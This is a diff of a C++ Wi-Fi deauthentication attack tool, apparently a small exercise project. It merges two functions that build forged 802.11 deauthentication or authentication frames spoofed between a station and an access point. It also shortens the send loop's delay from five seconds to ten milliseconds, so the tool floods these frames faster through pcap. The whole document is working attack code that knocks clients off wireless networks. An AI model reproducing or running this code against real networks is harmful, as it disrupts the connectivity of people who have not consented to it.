@@ -1,10 +1,10 @@
 #include "deauth-attack.hpp"
 
-void initDeauthPacket(deauth_packet& deauthPacket, const Param& param) {
+void initDisconnectPacket(deauth_packet& deauthPacket, const Param& param, bool isAuth) {
     deauthPacket.radio.it_version = 0;
     deauthPacket.radio.it_pad = 0;
-    deauthPacket.radio.it_len = 12;
-    deauthPacket.radio.it_present = 0x00008004;
+    deauthPacket.radio.it_len = sizeof(radiotap);
+    deauthPacket.radio.it_present = 0;
 
     deauthPacket.dataRate = 0x02;
     deauthPacket.zero = 0x00;
@@ -12,37 +12,14 @@ void initDeauthPacket(deauth_packet& deauthPacket, const Param& param) {
 
     deauthPacket.dot11.version = 0;
     deauthPacket.dot11.type = 0;
-    deauthPacket.dot11.subtype = deauthPacket.dot11.Deauthentication;
+    deauthPacket.dot11.subtype = (isAuth ? deauthPacket.dot11.Authentication : deauthPacket.dot11.Deauthentication);
     deauthPacket.dot11.flags = 0;
-    deauthPacket.dot11.duration = 314;
+    deauthPacket.dot11.duration = 0;
     deauthPacket.dot11.addr1_ = param.getAPMAC();
     deauthPacket.dot11.addr2_ = param.getStationMAC();
     deauthPacket.dot11.addr3_ = param.getAPMAC();
     deauthPacket.dot11.frag = 0;
-    deauthPacket.dot11.seq = 0x26;
-    deauthPacket.reasonCode = 0x0003;
-}
-
-void initAuthPacket(deauth_packet& deauthPacket, const Param& param) {
-    deauthPacket.radio.it_version = 0;
-    deauthPacket.radio.it_pad = 0;
-    deauthPacket.radio.it_len = 12;
-    deauthPacket.radio.it_present = 0x00008004;
-
-    deauthPacket.dataRate = 0x02;
-    deauthPacket.zero = 0x00;
-    deauthPacket.tx = 0x0018;
-
-    deauthPacket.dot11.version = 0;
-    deauthPacket.dot11.type = 0;
-    deauthPacket.dot11.subtype = deauthPacket.dot11.Authentication;
-    deauthPacket.dot11.flags = 0;
-    deauthPacket.dot11.duration = 314;
-    deauthPacket.dot11.addr1_ = param.getAPMAC();
-    deauthPacket.dot11.addr2_ = param.getStationMAC();
-    deauthPacket.dot11.addr3_ = param.getAPMAC();
-    deauthPacket.dot11.frag = 0;
-    deauthPacket.dot11.seq = 0x26;
+    deauthPacket.dot11.seq = 0;
     deauthPacket.reasonCode = 0x0003;
 }
 
@@ -63,8 +40,8 @@ bool deauth_attack(const Param& param) {
         return 1;
     }
 
-    if(param.isAuth()) initAuthPacket(deauthPacket, param);
-    else initDeauthPacket(deauthPacket, param);
+    if(param.isAuth()) initDisconnectPacket(deauthPacket, param, true);
+    else initDisconnectPacket(deauthPacket, param, false);
 
     while(not isEnd.load()) {
         if(pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&deauthPacket), sizeof(deauthPacket))) {
@@ -74,7 +51,7 @@ bool deauth_attack(const Param& param) {
             return false;
         }
 
-        sleep(5);
+        usleep(10000);
     }
 
     pcap_close(pcap);
